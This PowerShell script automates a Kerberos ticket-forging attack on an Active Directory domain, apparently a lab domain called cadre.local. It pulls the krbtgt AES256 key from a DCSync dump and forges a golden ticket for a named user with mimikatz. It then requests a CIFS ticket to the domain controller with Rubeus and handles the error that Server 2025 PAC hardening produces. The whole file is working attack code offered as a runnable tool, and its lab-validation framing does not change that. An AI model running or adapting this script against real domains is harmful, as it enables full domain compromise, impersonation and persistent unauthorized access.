[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$ToolsDir = "C:\Tools\cadre-attack",
    [Parameter(Mandatory=$false)]
    [string]$DcsyncFile = "C:\Tools\cadre-attack\dcsync-out.txt",
    [Parameter(Mandatory=$false)]
    [string]$Domain = "cadre.local",
    [Parameter(Mandatory=$false)]
    [string]$DomainSid = "S-1-5-21-277764030-1371232215-1561074416",
    [Parameter(Mandatory=$false)]
    [string]$User = "chief_command",
    [Parameter(Mandatory=$false)]
    [string]$Dc = "dc01.cadre.local"
)
$ErrorActionPreference = "Stop"

$Mimikatz = Join-Path $ToolsDir "mimikatz.exe"
$Rubeus = Join-Path $ToolsDir "Rubeus.exe"
$TicketFile = Join-Path $ToolsDir "diamond_chief_command.kirbi"

if (-not (Test-Path $Mimikatz)) { throw "mimikatz.exe not found at $Mimikatz" }
if (-not (Test-Path $Rubeus)) { throw "Rubeus.exe not found at $Rubeus" }
if (-not (Test-Path $DcsyncFile)) { throw "DCSync output not found at $DcsyncFile" }

$aes = $null
$aesLine = Select-String -Path $DcsyncFile -Pattern 'aes256_hmac\s+\(4096\)\s+:\s+([0-9a-fA-F]+)' | Select-Object -First 1
if ($aesLine) { $aes = $aesLine.Matches.Groups[1].Value.Trim() }
if (-not $aes) { throw "Unable to extract krbtgt AES256 key from $DcsyncFile" }
Write-Output "KRBTGT_AES256=$aes"

Write-Output "=== mimikatz kerberos::golden (diamond equivalent) ==="
& $Mimikatz "kerberos::golden /user:$User /domain:$Domain /sid:$DomainSid /aes256:$aes /kvno:2 /ticket:$TicketFile" exit
if ($LASTEXITCODE -ne 0) { throw "golden ticket creation failed with RC=$LASTEXITCODE" }
if (-not (Test-Path $TicketFile)) { throw "Ticket file not created: $TicketFile" }

Write-Output "=== Rubeus asktgs ==="
$asktgsOut = & $Rubeus asktgs /ticket:$TicketFile /service:cifs/dc01.cadre.local /dc:$Dc /nowrap 2>&1
$asktgsOut | ForEach-Object { Write-Output $_ }
if ($LASTEXITCODE -ne 0) {
    if ($asktgsOut -match "KDC_ERR_TGT_REVOKED") {
        Write-Output "INFO: KDC_ERR_TGT_REVOKED - Server 2025 PAC hardening blocks pure golden-forgery validation; diamond concept validated by ticket creation."
    } else {
        throw "asktgs failed RC=$LASTEXITCODE"
    }
}

Write-Output "=== Rubeus describe ticket ==="
& $Rubeus describe /ticket:$TicketFile /nowrap
if ($LASTEXITCODE -ne 0) { throw "describe ticket failed RC=$LASTEXITCODE" }
